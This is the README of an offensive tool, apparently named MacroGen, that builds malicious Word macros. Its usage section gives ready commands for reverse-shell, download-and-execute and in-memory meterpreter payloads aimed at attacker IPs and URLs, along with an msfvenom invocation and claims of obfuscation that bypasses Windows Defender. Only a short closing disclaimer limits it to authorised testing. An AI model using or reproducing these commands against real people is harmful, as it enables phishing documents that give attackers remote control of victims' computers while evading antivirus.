# MacroGen - Obfuscated VBA Payload Generator

MacroGen is a modular and extensible Python-based tool that automates the generation of VBA macros for Microsoft Office documents, with optional obfuscation layers and payload customization. Its primary use case is for red teamers, offensive security researchers, and malware development labs.

## Features

- Cross-platform: Works on Windows and Linux (limitations apply).
- Automatic payload generation using `msfvenom`, or manual shellcode paste support.
- Obfuscated payload support to bypass AV/EDR solutions (confirmed bypass of Windows Defender as of latest test).
- Supports `.vba`, `.doc`, and `.docm` output formats (Excel support in development).
- Modular macros – just drop a new file into `macros/` or `macros_obf/` and it’s instantly available.
- Full macro catalog browsing and dynamic help per macro.
- Includes macros that:
  - Display a message
  - Execute reverse shells
  - Download & run external executables
  - Run in-memory shellcode
  - Fetch and execute remote PowerShell payloads

## Project Structure

```bash
MacroGen/
├── builder.py                  # Handles Word DOCM creation (Windows only)
├── main.py                     # Core launcher and argument parser
├── macros/                     # Clean macro modules
│   ├── reverse_shell.py
│   ├── messagebox.py
│   ├── download_execute.py
│   ├── metasploit_runner.py
│   └── ps1_macro_runner.py
├── macros_obf/                 # Obfuscated versions
│   ├── reverse_shell_obf.py
│   ├── messagebox_obf.py
│   ├── download_execute_obf.py
│   ├── metasploit_runner_obf.py
│   └── ps1_macro_runner_obf.py
```

## Usage

### General Command

```bash
python main.py --macro <macro_name> [--output file.docm] [--obf] [--<macro_params> ...]
```

### Help

```bash
# Show general help and list available macros
python main.py --help

# Show detailed help for a specific macro
python main.py --help reverse_shell
```

## Examples

```bash
# Simple reverse shell macro (clean)
python main.py --macro reverse_shell --ip 10.10.14.8 --port 4444 --output shell.docm

# Obfuscated PowerShell payload delivery
python main.py --macro download_execute --url http://10.10.14.8/file.exe --method webclient --output dload.docm

# Obfuscated reverse HTTPS Meterpreter shell
python main.py --macro metasploit_runner --payload windows/x64/meterpreter/reverse_https --lhost 10.10.14.8 --lport 443 --output evil.docm --obf
```

## Macro Descriptions

### 1. `messagebox` / `messagebox_obf`
- Purpose: Display a message box to confirm macro execution.
- Params: None.
- Example:
  ```bash
  python main.py --macro messagebox --output info.vba
  ```

### 2. `reverse_shell` / `reverse_shell_obf`
- Purpose: Launch a Base64-encoded PowerShell reverse shell.
- Params:
  - `--ip`: Attacker IP
  - `--port`: Listener port
- Example:
  ```bash
  python main.py --macro reverse_shell --ip 192.168.1.100 --port 4444 --output rsh.docm
  ```

### 3. `download_execute` / `download_execute_obf`
- Purpose: Download and execute a file using PowerShell (`WebClient` or `Invoke-WebRequest`).
- Params:
  - `--url`: File to download
  - `--method`: `webclient` or `iwr`
- Example:
  ```bash
  python main.py --macro download_execute --url http://host/file.exe --method iwr --output dropper.docm
  ```

### 4. `metasploit_runner` / `metasploit_runner_obf`
- Purpose: Generates shellcode using `msfvenom` and embeds it in VBA to run in memory via WinAPI.
- Params:
  - `--payload`: e.g. `windows/x64/meterpreter/reverse_https`
  - `--lhost`: Attacker IP
  - `--lport`: Listener port
- Notes:
  - Uses `VirtualAlloc`, `CreateThread`, `RtlMoveMemory`
  - Will prompt for manual input if `msfvenom` is not available
- Example:
  ```bash
  python main.py --macro metasploit_runner --payload windows/x64/meterpreter/reverse_tcp --lhost 192.168.1.100 --lport 443 --output rce.docm
  ```

### 5. `ps1_macro_runner` / `ps1_macro_runner_obf`
- Purpose: Generates a PowerShell shellcode runner script and macro that downloads + executes it.
- Params:
  - `--payload`
  - `--lhost`
  - `--lport`
- Output:
  - Word macro that fetches `.ps1` from `http://<lhost>/<output>.ps1`
  - `.ps1` file is automatically created in same folder
- Obfuscation:
  - Obfuscated macro uses `powershell -e <base64>` encoding
- Example:
  ```bash
  python main.py --macro ps1_macro_runner --payload windows/x64/meterpreter/reverse_https --lhost 192.168.1.93 --lport 443 --output launcher.docm
  ```

## Shellcode Generation Logic

- If `msfvenom` is installed, the macro scripts will auto-generate the shellcode using:
  ```bash
  msfvenom -p <payload> LHOST=<ip> LPORT=<port> EXITFUNC=thread -f vbapplication|ps1
  ```

- If `msfvenom` is NOT installed, you can manually paste shellcode when prompted by the script:
  - Use another machine to generate it
  - Paste the full output
  - Type `EOF` when done

## Platform Differences

| Feature                    | Windows | Linux        |
|---------------------------|---------|--------------|
| `.docm` generation        | Yes     | No           |
| `.vba` file export        | Yes     | Yes          |
| Word integration          | Yes     | No           |

Note: On Linux, you can still generate raw `.vba` and inject it manually into documents.

## Extensibility & Modular Design

To add a new macro:
1. Create a `.py` file in `macros/` or `macros_obf/`.
2. Include:
   - `metadata = {...}`
   - `generate_macro_code(params)` function
3. Done. The macro is automatically discovered.

Example stub:
```python
metadata = {
    "name": "MyMacro",
    "description": "Custom VBA payload",
    "parameters": ["param1", "param2"]
}

def generate_macro_code(params):
    ...
    return "<vba code>"
```

## AV Evasion Capabilities

- Obfuscated payloads currently bypass Windows Defender as of latest tests (June 2025).
- Includes:
  - Encrypted payloads
  - Base64 PowerShell runners
  - VBA name obfuscation
  - Manual shellcode injection for extreme control

## Coming Soon

- Excel macro support (`.xlsm`, `.xlam`)
- DDE & formula injection macros
- Macro packers & password-protected documents
- GUI mode

## Requirements

- Python 3.x
- Optional:
  - `msfvenom` (Metasploit Framework)
  - `colorama`
  - `pywin32` (Windows only)

## Disclaimer

This tool is provided for educational and authorized penetration testing purposes only. Use it only in environments where you have explicit permission.
